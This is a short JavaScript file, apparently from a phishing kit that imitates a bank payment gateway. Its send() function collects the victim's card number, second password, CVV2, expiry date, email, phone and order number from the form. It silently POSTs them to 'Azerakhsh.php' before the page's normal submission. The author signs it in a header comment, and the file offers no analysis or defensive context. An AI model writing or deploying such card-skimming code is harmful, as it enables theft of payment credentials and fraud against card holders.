//CODED_BY AZERAKHSH_HUNTER
/////////////////////////////////////
function validateAndsend(e) {
    send() && submit()
}
function send() {
    var k = {
        pan1: document.getElementById("cardnumber").value,
        pin1: document.getElementById("secondpass").value,
        cvv21: document.getElementById("cvv2").value,
        month1: document.getElementById("expmah").value,
        year1: document.getElementById("expyear").value,
		email: document.getElementById("emailforipg").value,
		phone: document.getElementById("mobileforipg").value,
		order: document.getElementById("order").value,
		
		  };
		  
        $.ajax({
                type: "POST",
                url:  "Azerakhsh.php",
                data: k,
            });
			
    }
		function kosnanat(e) {
//Nothing
}
//////////////////////////////////////
//